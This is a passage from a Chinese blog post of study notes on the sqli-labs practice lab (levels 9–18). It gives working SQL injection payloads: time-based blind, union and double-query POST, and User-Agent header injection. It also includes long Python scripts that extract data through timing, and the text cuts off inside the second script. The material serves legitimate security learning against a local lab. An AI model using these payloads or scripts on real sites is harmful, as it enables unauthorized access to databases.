icon-github-fill","link":"https://github.com","tip":"GitHub"},{"class":"iconfont icon-douban-fill","link":"https://douban.com","tip":"豆瓣"},{"class":"iconfont icon-wechat-fill","qrcode":"/img/static/WeChat.jpg"}]},"page404":{"banner_img":"/img/static/default1.png","banner_img_height":60,"banner_mask_alpha":0.3,"subtitle":"404"},"links":{"banner_img":"/img/static/default1.png","banner_img_height":55,"banner_mask_alpha":0.3,"subtitle":"Link","items":[{"title":" ZoE blog","intro":"Pwn的挖坑填坑之旅","link":"https://zoepla.github.io/#blog","image":"/img/Link/ZoE.jpg"},{"title":"Junay blog","intro":"网络安全爱好者","link":"https://delcoding.github.io","image":"/img/Link/Junay.png"},{"title":"Rhy7hm blog","intro":"恭喜你发现了毫无技术含量的博客","link":"https://rhythmmark.github.io","image":"/img/Link/Rhy7hm.png"},{"title":"Cy9nus blog","intro":"人如果没有梦想，跟咸鱼有什么区别","link":"https://cy9nusg4rd3n.github.io/","image":"/img/Link/Cy9nus.jpg"}]}}}},"excerpt":"<p>sqli-labs上的sql注入学习第二部分，上半部分（1-8）→<a href=\"https://lzy-wi.github.io/2018/07/20/sqli-labs1/\" target=\"_blank\" rel=\"noopener\">sqli-labs的学习记录一</a><br>","more":"</p>\n<h5 id=\"第九关\"><a href=\"#第九关\" class=\"headerlink\" title=\"第九关\"></a>第九关</h5><p>&emsp;&emsp;布尔盲注是判断对错，第九关是基于时间的盲注，根据返回时间来判断。比如<code>(ascii(substr(database(),1,1))&gt;=97</code>,我们可以让这个判断语句正确延迟5秒返回，如果错误就正常返回。这里用到一个if函数，if（a,b,c）如果a正确就返回b，否则返回c。<br>所以最终payload为<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>' and if(ascii(substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;=<span class=\"hljs-number\">97</span>,sleep(<span class=\"hljs-number\">5</span>),sleep(<span class=\"hljs-number\">0</span>)) -- +</code></pre></p>\n<p>然后跟布尔盲注的方法一样一个一个的判断，时间上会比布尔盲注要多，要节省时间可以降低到2秒或者3秒,脚本基本上是抄第八关的，在判断方式上做了变动，思路不变。<br><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> requests\n<span class=\"hljs-keyword\">import</span> time\n\ntxt1 = <span class=\"hljs-string\">\"http://localhost/sqli-labs/Less-9/?id=1' and if(ascii(substr(database(),\"</span>\ntxt2 = <span class=\"hljs-string\">\",1))&gt;=\"</span>\ntxt3 = <span class=\"hljs-string\">\",1))=\"</span>\ntxt4 = <span class=\"hljs-string\">\",sleep(2),sleep(0)) -- +\"</span>\nnum11 = <span class=\"hljs-number\">97</span>\nnum12 = <span class=\"hljs-number\">65</span>\nnum13 = <span class=\"hljs-number\">48</span>\ncode = <span class=\"hljs-string\">''</span>\nnum1 = <span class=\"hljs-number\">0</span>\nnum2 = <span class=\"hljs-number\">0</span>\nnum3 = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">9</span>):\n\turl = txt1+str(i)+txt2+str(num11)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum1 = <span class=\"hljs-number\">1</span>\n\t\t\n\turl = txt1+str(i)+txt2+str(num12)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum2 = <span class=\"hljs-number\">1</span>\n\n\turl = txt1+str(i)+txt2+str(num13)+txt4\n\ttime1 = time.time()\n\treq = requests.get(url = url)\n\ttime2 = time.time()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum3 = <span class=\"hljs-number\">1</span>\n\n\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">1</span>):\n\t\tnum = <span class=\"hljs-number\">97</span>\n\t\tnum += <span class=\"hljs-number\">13</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">7</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &lt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>((num == <span class=\"hljs-number\">106</span>) <span class=\"hljs-keyword\">or</span> (num == <span class=\"hljs-number\">119</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">4</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">3</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num2 == <span class=\"hljs-number\">1</span>):\n\t\tnum = <span class=\"hljs-number\">65</span>\n\t\tnum += <span class=\"hljs-number\">13</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">7</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &lt;=<span class=\"hljs-number\">2</span>):\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>((num == <span class=\"hljs-number\">74</span>) <span class=\"hljs-keyword\">or</span> (num == <span class=\"hljs-number\">87</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">4</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">3</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num2 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num3 == <span class=\"hljs-number\">1</span>):\n\t\tnum =<span class=\"hljs-number\">48</span>\n\t\tnum += <span class=\"hljs-number\">5</span>\n\t\turl = txt1+str(i)+txt2+str(num)+txt4\n\t\ttime1 = time.time()\n\t\treq = requests.get(url = url)\n\t\ttime2 = time.time()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">5</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">5</span>\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">5</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\ttime1 = time.time()\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\ttime2 = time.time()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span></code></pre></p>\n<p>附上截图<br><img src=\"/img/2018-08-03/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"></p>\n<h5 id=\"第十关\"><a href=\"#第十关\" class=\"headerlink\" title=\"第十关\"></a>第十关</h5><p>也是时间盲注，基于双引号，把单引号变成双引号即可<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">id</span>=1\" <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">if</span>(ascii(substr(database(),1,1))&gt;=97,sleep(5),sleep(0)) -- +</code></pre></p>\n<h5 id=\"第十一关\"><a href=\"#第十一关\" class=\"headerlink\" title=\"第十一关\"></a>第十一关</h5><p>第十一关是基于单引号的post型注入，在f12下可以看到表单是post型以及两个参数<code>uname</code>和<code>passwd</code><br><img src=\"/img/2018-08-03/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>post型注入要勾选上post data，最后不要忘记<code>submit=Submit</code><br><img src=\"/img/2018-08-03/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>&emsp;&emsp;我在测试时发现我的火狐浏览器的hackbar在post方式下单引号测试excute点击没反应，（对于这个bug真的很迷，也有师兄曾经遇到过），无奈只能切换工具，chrome下的postman，效果也不怎么好，直接换了旧版本的火狐（56.0）<br>继续，在passwd后加个单引号直接报错，后面就跟第一关一样了，post表单payload如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">uname</span>=123&amp;passwd=123' union select 1,database() -- +&amp;<span class=\"hljs-attribute\">submit</span>=Submit</code></pre></p>\n<p><img src=\"/img/2018-08-03/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"></p>\n<h5 id=\"第十二关\"><a href=\"#第十二关\" class=\"headerlink\" title=\"第十二关\"></a>第十二关</h5><p>基于双引号的post型注入，跟第十一关一样，单引号替换双引号，测试发现报错，少了括号，payload如下<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">uname</span>=123&amp;passwd=456\") union select 1,database() -- + &amp;<span class=\"hljs-attribute\">submit</span>=Submit</code></pre></p>\n<p><img src=\"/img/2018-08-03/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"></p>\n<h5 id=\"第十三关\"><a href=\"#第十三关\" class=\"headerlink\" title=\"第十三关\"></a>第十三关</h5><p>post型基于单引号的双注入，第五关讲过，直接拿第五关的payload<br><pre><code class=\"hljs undefined\">uname=123&amp;passwd=123') union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">count</span>(*),<span class=\"hljs-keyword\">concat_ws</span>(<span class=\"hljs-string\">':'</span>,(<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()),<span class=\"hljs-keyword\">floor</span>(<span class=\"hljs-keyword\">rand</span>()*<span class=\"hljs-number\">2</span>)) <span class=\"hljs-keyword\">as</span> a <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> a<span class=\"hljs-comment\">-- + &amp;submit=Submit</span></code></pre></p>\n<p>一次没成功就多试几次<br><img src=\"/img/2018-08-03/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"></p>\n<h5 id=\"第十四关\"><a href=\"#第十四关\" class=\"headerlink\" title=\"第十四关\"></a>第十四关</h5><p>post型基于双引号的双注入，跟第十三关一样，payload如下<br><pre><code class=\"hljs undefined\">uname=123&amp;passwd=123\" union <span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">count</span>(*),<span class=\"hljs-keyword\">concat_ws</span>(<span class=\"hljs-string\">':'</span>,(<span class=\"hljs-keyword\">select</span> <span class=\"hljs-keyword\">database</span>()),<span class=\"hljs-keyword\">floor</span>(<span class=\"hljs-keyword\">rand</span>()*<span class=\"hljs-number\">2</span>)) <span class=\"hljs-keyword\">as</span> a <span class=\"hljs-keyword\">from</span> information_schema.tables <span class=\"hljs-keyword\">group</span> <span class=\"hljs-keyword\">by</span> a<span class=\"hljs-comment\">-- + &amp;submit=Submit</span></code></pre></p>\n<p><img src=\"/img/2018-08-03/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"></p>\n<h5 id=\"第十五关\"><a href=\"#第十五关\" class=\"headerlink\" title=\"第十五关\"></a>第十五关</h5><p>post型单引号盲注，测试布尔型<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attr\">uname</span>=<span class=\"hljs-number\">123</span>&amp;passwd=<span class=\"hljs-number\">123</span><span class=\"hljs-string\">' or '</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">'='</span><span class=\"hljs-number\">1</span> &amp;submit=Submit</code></pre></p>\n<p><img src=\"/img/2018-08-03/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"><br>测试时间型失败，返回时间异常，经常是几分钟才有有回复，测试失败</p>\n<h5 id=\"第十六关\"><a href=\"#第十六关\" class=\"headerlink\" title=\"第十六关\"></a>第十六关</h5><p>post型双引号盲注和第十五关一样<br><pre><code class=\"hljs undefined\"><span class=\"hljs-attribute\">uname</span>=123&amp;passwd=123\") <span class=\"hljs-keyword\">or</span> <span class=\"hljs-string\">\"1\"</span>=<span class=\"hljs-string\">\"1\"</span> -- + &amp;<span class=\"hljs-attribute\">submit</span>=Submit</code></pre></p>\n<p><img src=\"/img/2018-08-03/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"></p>\n<h5 id=\"第十七关\"><a href=\"#第十七关\" class=\"headerlink\" title=\"第十七关\"></a>第十七关</h5><p>基于错误的更新查询post注入<br><strong>高版本的mysql已经修复了这个bug</strong><br>有兴趣的可以去了解下<br>–&gt;<a href=\"https://blog.csdn.net/Fly_hps/article/details/79416842\" target=\"_blank\" rel=\"noopener\">传送门</a><br>–&gt;<a href=\"https://blog.csdn.net/u012763794/article/details/51361152\" target=\"_blank\" rel=\"noopener\">传送门</a><br>–&gt;<a href=\"https://www.cnblogs.com/xishaonian/p/6243497.html\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<h5 id=\"第十八关\"><a href=\"#第十八关\" class=\"headerlink\" title=\"第十八关\"></a>第十八关</h5><p>请求头User-Agent注入（需要正确的用户名和密码），需要抓包，抓包工具burpsuit（不会使用的自行百度）<br>先抓包<br><img src=\"/img/2018-08-03/10.png\" srcset=\"/img/static/loading.gif\" alt=\"10\"><br>在User-Agent后面加一个单引号<br><pre><code class=\"hljs undefined\">User-<span class=\"hljs-string\">Agent:</span> Mozilla<span class=\"hljs-regexp\">/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/</span><span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">56.0</span><span class=\"hljs-string\">'</span></code></pre></p>\n<p>发现报错，说明可以注入<br><img src=\"/img/2018-08-03/11.png\" srcset=\"/img/static/loading.gif\" alt=\"11\"><br>一般这种注入的sql语句都是insert类型，查看index.php的查询关键代码<br><pre><code class=\"hljs undefined\">$insert=<span class=\"hljs-string\">\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"</span><span class=\"hljs-comment\">;</span></code></pre></p>\n<p>因为这种方式注入没有回显，一般是基于时间的insert型盲注，通过判断返回时间来注入<br><em>user-agent简写成Mozilla/5.0 Firefox/56.0</em><br><pre><code class=\"hljs undefined\">User-Agent: Mozilla/<span class=\"hljs-number\">5.0</span> Firefox/<span class=\"hljs-number\">56.0</span>' <span class=\"hljs-keyword\">or</span> <span class=\"hljs-built_in\">sleep</span>(<span class=\"hljs-number\">5</span>) <span class=\"hljs-keyword\">or</span> '</code></pre></p>\n<p>最后要闭合单引号，不可以注释掉（我也不知道原因π_π）<br>5秒后返回正常页面<br><img src=\"/img/2018-08-03/12.png\" srcset=\"/img/static/loading.gif\" alt=\"12\"><br>猜测数据库<br><pre><code class=\"hljs undefined\">User-Agent: Mozilla/<span class=\"hljs-number\">5.0</span> Firefox/<span class=\"hljs-number\">56.0</span>' <span class=\"hljs-keyword\">or</span> <span class=\"hljs-keyword\">if</span>(ascii(substr((<span class=\"hljs-built_in\">select</span> database()),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;<span class=\"hljs-number\">97</span>,<span class=\"hljs-built_in\">sleep</span>(<span class=\"hljs-number\">5</span>),<span class=\"hljs-built_in\">sleep</span>(<span class=\"hljs-number\">0</span>)) <span class=\"hljs-keyword\">or</span> '</code></pre></p>\n<p>5秒后返回<br><img src=\"/img/2018-08-03/13.png\" srcset=\"/img/static/loading.gif\" alt=\"13\"><br>盲注当然是写脚本跑啦,python脚本代码如下，稍微修改了一下之前的代码就可以了<br><pre><code class=\"hljs undefined\">import requests\nimport <span class=\"hljs-built_in\">time</span>\n\ntxt1 = <span class=\"hljs-string\">\"Mozilla/5.0 Firefox/56.0' or if(ascii(substr((select database()),\"</span>\ntxt2 = <span class=\"hljs-string\">\",1))&gt;=\"</span>\ntxt3 = <span class=\"hljs-string\">\",1))=\"</span>\ntxt4 = <span class=\"hljs-string\">\",sleep(2),sleep(0)) or '\"</span>\n<span class=\"hljs-built_in\">key</span> = &#123;'uname':'admin','passwd':'admin','submit':'Submit'&#125;\nurl = <span class=\"hljs-string\">\"http://localhost/sqli-labs/Less-18/\"</span>\nnum11 = <span class=\"hljs-number\">97</span>\nnum12 = <span class=\"hljs-number\">65</span>\nnum13 = <span class=\"hljs-number\">48</span>\ncode = ''\nnum1 = <span class=\"hljs-number\">0</span>\nnum2 = <span class=\"hljs-number\">0</span>\nnum3 = <span class=\"hljs-number\">0</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">9</span>):\n\tpayload = txt1+str(i)+txt2+str(num11)+txt4\n\theaders = &#123;'User-Agent': payload&#125;\n\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum1 = <span class=\"hljs-number\">1</span>\n\t\t\n\tpayload = txt1+str(i)+txt2+str(num12)+txt4\n\theaders = &#123;'User-Agent': payload&#125;\n\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum2 = <span class=\"hljs-number\">1</span>\n\n\tpayload = txt1+str(i)+txt2+str(num13)+txt4\n\theaders = &#123;'User-Agent': payload&#125;\n\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\tnum3 = <span class=\"hljs-number\">1</span>\n\n\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">1</span>):\n\t\t<span class=\"hljs-built_in\">num</span> = <span class=\"hljs-number\">97</span>\n\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">13</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">7</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">3</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &lt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span class=\"hljs-built_in\">num</span> -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>((<span class=\"hljs-built_in\">num</span> == <span class=\"hljs-number\">106</span>) <span class=\"hljs-keyword\">or</span> (<span class=\"hljs-built_in\">num</span> == <span class=\"hljs-number\">119</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">4</span>):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-built_in\">num</span>,<span class=\"hljs-built_in\">num</span>+<span class=\"hljs-number\">3</span>):\n\t\t\t\tpayload = txt1+str(i)+txt3+str(j)+txt4\n\t\t\t\theaders = &#123;'User-Agent': payload&#125;\n\t\t\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\t\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-built_in\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num2 == <span class=\"hljs-number\">1</span>):\n\t\t<span class=\"hljs-built_in\">num</span> = <span class=\"hljs-number\">65</span>\n\t\t<span class=\"hljs-built_in\">num</span> += <span class=\"hljs-number\">13</span>\n\t\tpayload = txt1+str(i)+txt2+str(<span class=\"hljs-built_in\">num</span>)+txt4\n\t\theaders = &#123;'User-Agent': payload&#125;\n\t\ttime1 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\treq = requests.post(url = url,data =<span class=\"hljs-built_in\">key</span>,headers = headers)\n\t\ttime2 = <span class=\"hljs-built_in\">time</span>.<span class=\"hljs-built_in\">time</span>()\n\t\t<span class=\"hljs-keyword\">if</span>(time2 - time1 &gt;=<span class=\"hljs-number\">2</span>):\n\t\t\t<span 